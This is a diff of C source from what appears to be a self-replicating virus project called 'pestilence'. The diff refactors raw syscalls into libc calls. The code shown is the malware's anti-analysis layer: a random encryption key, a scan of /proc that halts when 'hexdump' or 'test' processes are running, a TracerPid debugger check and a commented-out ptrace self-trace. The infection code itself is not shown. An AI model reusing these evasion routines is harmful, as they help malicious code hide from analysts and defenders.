@@ -5,8 +5,8 @@
 #include <sys/mman.h>
 
 #include "pestilence.h"
-#include "syscall.h"
 #include "utils.h"
+#include "syscall.h"
 
 int64_t gen_key_64(void) {
 
@@ -14,19 +14,19 @@ int64_t gen_key_64(void) {
 
 	char urandom[] = "/dev/urandom";
 
-	const int fd = _syscall(SYS_open, urandom, O_RDONLY, 0);
+	const int fd = open(urandom, O_RDONLY, 0);
 
 	if (fd == -1) {
 		return key;
 	}
 
-	if (_syscall(SYS_read, fd, &key, sizeof(int64_t)) == -1) {
-		_syscall(SYS_close, fd);
+	if (read(fd, &key, sizeof(int64_t)) == -1) {
+		close(fd);
 		return key;
 	}
 
 
-	_syscall(SYS_close, fd);
+	close(fd);
 	return key;
 }
 
@@ -43,20 +43,20 @@ void encrypt(uint8_t *data, const size_t size, uint64_t key) {
 static int check_proc(const char *dir_path) {
 
 	const char *forbidden[] = {
-		((char []){"hexdump"}),
-		((char []){"test"}),
+		STR("hexdump"),
+		STR("test"),
 		(void *)0
 	};
 
 	char file[PATH_MAX];
 
-	int fd = _syscall(SYS_open, dir_path, O_RDONLY);
+	int fd = open(dir_path, O_RDONLY);
 	if (fd == -1)
 		return 1;
 
-	ssize_t ret = _syscall(SYS_read, fd, file, PATH_MAX);
+	ssize_t ret = read(fd, file, PATH_MAX);
 	if (ret == -1) {
-		_syscall(SYS_close, fd);
+		close(fd);
 		return 1;
 	}
 
@@ -64,12 +64,12 @@ static int check_proc(const char *dir_path) {
 
 	for (size_t i = 0; forbidden[i]; ++i) {
 		if (ft_memcmp(file, forbidden[i], ft_strlen(forbidden[i])) == 0) {
-			_syscall(SYS_close, fd);
+			close(fd);
 			return 1;
 		}
 	}
 
-	_syscall(SYS_close, fd);
+	close(fd);
 
 	return 0;
 }
@@ -86,7 +86,7 @@ static int forbid_proc(void)
 {
 	const char proc[] = "/proc";
 
-	int fd = _syscall(SYS_open, proc, O_RDONLY);
+	int fd = open(proc, O_RDONLY);
 
 	if (fd == -1)
 		return 1;
@@ -97,7 +97,7 @@ static int forbid_proc(void)
 
 	for(;;)
 	{
-		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
+		ret = getdents64(fd, buf, PATH_MAX);
 		if (ret <= 0)
 			break;
 		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
@@ -122,14 +122,14 @@ static int forbid_proc(void)
 				ptr = ft_stpncpy(ptr, comm, PATH_MAX - (ptr - new_path));
 
 				if (check_proc(new_path) != 0) {
-					_syscall(SYS_close, fd);
+					close(fd);
 					return 1;
 				}
 			}
 		}
 	}
 
-	_syscall(SYS_close, fd);
+	close(fd);
 
 	return 0;
 }
@@ -137,19 +137,19 @@ static int forbid_proc(void)
 int is_debugged(void) {
 
 	int res = 0;
-	int fd = _syscall(SYS_open, ((char []){"/proc/self/status"}), O_RDONLY);
+	int fd = open(STR("/proc/self/status"), O_RDONLY);
 
 	if (fd == -1)
 		return 1;
 
 	char buf[4096];
 
-	ssize_t ret = _syscall(SYS_read, fd, buf, 4096);
+	ssize_t ret = read(fd, buf, 4096);
 	if (ret == -1) 
 		return 1;
 	buf[ret] = '\0';
 
-	char *ptr = ft_memmem(buf, ret, ((char []){"TracerPid:"}), 10);
+	char *ptr = ft_memmem(buf, ret, STR("TracerPid:"), 10);
 	if (ptr != 0) {
 		ptr += 10;
 		while (*ptr == ' ' || *ptr == '\t')
@@ -159,7 +159,7 @@ int is_debugged(void) {
 		}
 	}
 
-	_syscall(SYS_close, fd);
+	close(fd);
 	return res;
 }
 
@@ -199,7 +199,7 @@ int pestilence(void)
 
 //static int	check_ptrace(void)
 //{
-//	if (_syscall(SYS_ptrace, PTRACE_TRACEME, 0, 0, 0) == -1)
+//	if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
 //		return (1);
 //	return (0);
 //}
